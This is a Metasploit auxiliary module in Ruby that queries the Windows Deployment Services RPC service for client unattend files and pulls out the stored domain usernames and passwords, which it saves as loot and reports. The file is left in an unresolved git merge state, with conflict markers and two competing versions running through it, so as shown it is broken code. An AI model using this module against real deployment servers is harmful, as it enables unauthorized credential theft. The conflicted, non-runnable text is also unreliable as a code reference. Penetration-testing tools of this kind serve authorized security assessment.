##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/proto/dcerpc'
<<<<<<< HEAD
require 'rex/proto/dcerpc/wdscp'
require 'rex/parser/unattend'

=======
require 'rex/parser/unattend'

load '/opt/metasploit/msf3/lib/rex/parser/unattend.rb'
load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/client.rb'
load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/packet.rb'
load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/handle.rb'

>>>>>>> 2a61655665126db1c22648114013fcc1be70a016
class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Remote::DCERPC
	include Msf::Auxiliary::Report 

    DCERPCPacket   = Rex::Proto::DCERPC::Packet
    DCERPCClient   = Rex::Proto::DCERPC::Client
    DCERPCResponse = Rex::Proto::DCERPC::Response
    DCERPCUUID     = Rex::Proto::DCERPC::UUID
<<<<<<< HEAD
	
	WDS_CONST 	= Rex::Proto::DCERPC::WDSCP::Constants
=======
>>>>>>> 2a61655665126db1c22648114013fcc1be70a016

	
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Windows Deployment Services Unattend Retrieval',
			'Description'    => %q{
						This module retrieves the client unattend file from Windows
						Deployment Services RPC service and parses out the stored credentials
			},
			'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '',
			'References'     =>
				[
					[ 'MSDN', 'http://msdn.microsoft.com/en-us/library/dd891255(prot.20).aspx'],
				],
			'DisclosureDate' => 'N/A',
			))

		register_options(
			[
				Opt::RPORT(5040),
			], self.class)
<<<<<<< HEAD
			
		register_advanced_options(
			[
				OptBool.new('ENUM_ARM', [true, 'Enumerate Unattend for ARM architectures (not supported by Windows and will cause an error in System Event Log)', false])
			], self.class)	
=======
		
		#Easier way to make these into enum?
		@architectures = {
			'x64' => 9,
			'x86' => 0,
			'ia64' => 6,
			'arm' => 5
		}
>>>>>>> 2a61655665126db1c22648114013fcc1be70a016
	end
	
	def run 
		# Create a handler with our UUID and Transfer Syntax
<<<<<<< HEAD
		self.handle = Rex::Proto::DCERPC::Handle.new(	[WDS_CONST::WDSCP_RPC_UUID, '1.0','71710533-beba-4937-8319-b5dbef9ccc36', 1],
=======
		self.handle = Rex::Proto::DCERPC::Handle.new(	['1a927394-352e-4553-ae3f-7cf4aafca620', '1.0','71710533-beba-4937-8319-b5dbef9ccc36', 1],
>>>>>>> 2a61655665126db1c22648114013fcc1be70a016
														'ncacn_ip_tcp', 
														rhost, 
														[datastore['RPORT']])
		
		print_status("Binding to #{handle} ...")
		begin
			self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
<<<<<<< HEAD
			vprint_status("Bound to #{handle}")
=======
			vprint_status("Bound to #{handle} ...")
>>>>>>> 2a61655665126db1c22648114013fcc1be70a016
			rescue
				print_error("Unable to bind")
				return
		end
		
		table = Rex::Ui::Text::Table.new({
                        'Header' => 'WindowsDeploymentServices',
                        'Indent' => 1,
                        'Columns' => ['Architecture', 'Domain', 'Username', 'Password']
        })
		
<<<<<<< HEAD
		creds_found = false
		
		WDS_CONST::ARCHITECTURE.each do |architecture|
			if architecture[0] == :ARM && !datastore['ENUM_ARM']
				vprint_status "Skipping #{architecture[0]} architecture due to adv option"
				next
			end
			
=======
		@architectures.each do |architecture|
>>>>>>> 2a61655665126db1c22648114013fcc1be70a016
			result = request_client_unattend(architecture)
			
			unless result.nil?
				loot_unattend(architecture[0], result)
				results = parse_client_unattend(result)
				
				results.each do |result|
					unless result.empty?
						unless result['username'].nil? || result['password'].nil?
							print_good("Retrived credentials for #{architecture[0]}")
<<<<<<< HEAD
							creds_found = true
=======
>>>>>>> 2a61655665126db1c22648114013fcc1be70a016
							report_creds(result['domain'], result['username'], result['password'])
							table << [architecture[0], result['domain'], result['username'], result['password']]
						end
					end
				end
			end
		end
		
<<<<<<< HEAD
		if creds_found
			print_line
			table.print 
			print_line
		else
			print_error("No Unattend files received, service is unlikely to be configured for zero-touch install.")
		end
	end
	
	def request_client_unattend(architecture)	
		# Construct WDS Control Protocol Message		
		packet = Rex::Proto::DCERPC::WDSCP::Packet.new(:REQUEST, :GET_CLIENT_UNATTEND)
		packet.add_var(	WDS_CONST::VAR_NAME_ARCHITECTURE, [architecture[1]].pack('C'))			
		packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_GUID, 
						"\x35\x00\x36\x00\x34\x00\x44\x00\x41\x00\x36\x00\x31\x00\x44\x00"\
						"\x32\x00\x41\x00\x45\x00\x31\x00\x41\x00\x41\x00\x42\x00\x32\x00"\
						"\x38\x00\x36\x00\x34\x00\x46\x00\x34\x00\x34\x00\x46\x00\x32\x00"\
						"\x38\x00\x32\x00\x46\x00\x30\x00\x34\x00\x33\x00\x34\x00\x30\x00"\
						"\x00\x00")
		packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_MAC,
						"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00"\
						"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00"\
						"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x35\x00\x30\x00"\
						"\x35\x00\x36\x00\x33\x00\x35\x00\x31\x00\x41\x00\x37\x00\x35\x00"\
						"\x00\x00")
		packet.add_var(	WDS_CONST::VAR_NAME_VERSION,"\x00\x00\x00\x01\x00\x00\x00\x00")	
		wdsc_packet = packet.create
		
		print_status("Sending #{architecture[0]} Client Unattend request ...")
		response = dcerpc.call(0, wdsc_packet)
=======
		print_line table.to_s
	end
	
	def request_client_unattend(architecture)	
		# Construct WDS Control Protocol Message:
		header = "\x38\x02\x00\x00\x00\x00\x00\x00\x38\x02\x00\x00\x00\x00\x00\x00"
		endpoint_header = "\x28\x00\x00\x01\x10\x02\x00\x00\x5a\xeb\xde\xd8\xfd\xef\xb2\x43\x99\xfc\x1a\x8a\x59\x21\xc2\x27\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		operation_header = "\x10\x02\x00\x00\x00\x01\x01\x73\x05\x00\x00\x00\x04\x00\x00\x00"
		
		architecture_variable_header = "\x41\x00\x52\x00\x43\x00\x48\x00\x49\x00\x54\x00\x45\x00\x43\x00\x54\x00\x55\x00\x52\x00\x45\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
		
		arch  = [architecture[1]].pack('C')
		
		architecture_value = "#{arch}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		architecture_variable = architecture_variable_header + architecture_value
		
		client_guid_variable = "\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x5f\x00\x47\x00\x55\x00\x49\x00\x44\x00\x00\x00\x49\x00\x44\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x42\x00\x00\x00\x00\x00\x00\x00\x35\x00\x36\x00\x34\x00\x44\x00\x41\x00\x36\x00\x31\x00\x44\x00\x32\x00\x41\x00\x45\x00\x31\x00\x41\x00\x41\x00\x42\x00\x32\x00\x38\x00\x36\x00\x34\x00\x46\x00\x34\x00\x34\x00\x46\x00\x32\x00\x38\x00\x32\x00\x46\x00\x30\x00\x34\x00\x33\x00\x34\x00\x30\x00\x00\x00\x61\x00\x38\x00\x39\x00\x00\x00\x6d\x69\x6e\x69\x6e\x74"
		client_mac_variable_header = "\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x5f\x00\x4d\x00\x41\x00\x43\x00\x00\x00\x36\x6f\x31\x33\x37\x3c\x08\x4d\x53\x46\x54\x20\x35\x2e\x30\x37\x0c\x01\x0f\x03\x06\x2c\x2e\x2f\x1f\x21\x79\xf9\x2b\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x42\x00\x00\x00\x00\x00\x00\x00"

		# TODO Does this need to match our current MAC? Doesn't appear to care.
		client_mac_value = "\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x35\x00\x30\x00\x35\x00\x36\x00\x33\x00\x35\x00\x31\x00\x41\x00\x37\x00\x35\x00\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

		version_variable = "\x56\x00\x45\x00\x52\x00\x53\x00\x49\x00\x4f\x00\x4e\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		
		stub_data = header + endpoint_header + operation_header + architecture_variable + client_guid_variable + client_mac_variable_header + client_mac_value + version_variable
		
		vprint_status("Sending #{architecture[0]} Client Unattend request ...")
		response = dcerpc.call(0, stub_data)
>>>>>>> 2a61655665126db1c22648114013fcc1be70a016

		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			vprint_status('Received response ...')
			data = dcerpc.last_response.stub_data
			
<<<<<<< HEAD
			# Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000
			op_error_code = data.unpack('i*')[18]
			if op_error_code == 0
				# TODO Check error case where FLAGS variable is 0 (ie no Client Unattend found)
				if data.length < 277
					vprint_error("No Unattend received for #{architecture[0]} architecture")
					return nil
				else
					vprint_status("Received #{architecture[0]} unattend file ...")
					return extract_unattend(data)
				end
=======
			# Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000)
			op_error_code = data.unpack('i*')[18]
			if op_error_code == 0
				vprint_status("Received #{architecture[0]} response")
				return extract_unattend(dcerpc.last_response.stub_data)
>>>>>>> 2a61655665126db1c22648114013fcc1be70a016
			else
				vprint_error("Error code received for #{architecture[0]}: #{op_error_code}")
				return nil
			end
		end
	end
	
	def extract_unattend(data)
<<<<<<< HEAD
		start = data.index('<?xml')		
=======
		start = data.index('<?xml')
>>>>>>> 2a61655665126db1c22648114013fcc1be70a016
		finish = data.index('</unattend>')+10
		return data[start..finish]
	end
	
	def parse_client_unattend(data)
		begin
			xml = REXML::Document.new(data)

			rescue REXML::ParseException => e
					print_error("Invalid XML format")
					vprint_line(e.message)
			end
    
		return Rex::Parser::Unattend.parse(xml).flatten
	end
	
	def loot_unattend(archi, data)
			return if data.empty?	
			p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
			print_status("Raw version of #{archi} saved as: #{p}")
	end
	
<<<<<<< HEAD
=======
	def loot_unattend(archi, data)
			return if data.empty?	
			p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
			print_status("Raw version of #{archi} to loot")
	end
	
>>>>>>> 2a61655665126db1c22648114013fcc1be70a016
	def report_creds(domain, user, pass)
		report_auth_info(
				:host  => rhost,
				:port => 4050,
				:sname => 'dcerpc',
				:proto => 'tcp',
				:source_id => nil,
				:source_type => "aux",
				:user => "#{domain}\\#{user}",
				:pass => pass)
	end
<<<<<<< HEAD
=======


>>>>>>> 2a61655665126db1c22648114013fcc1be70a016
end
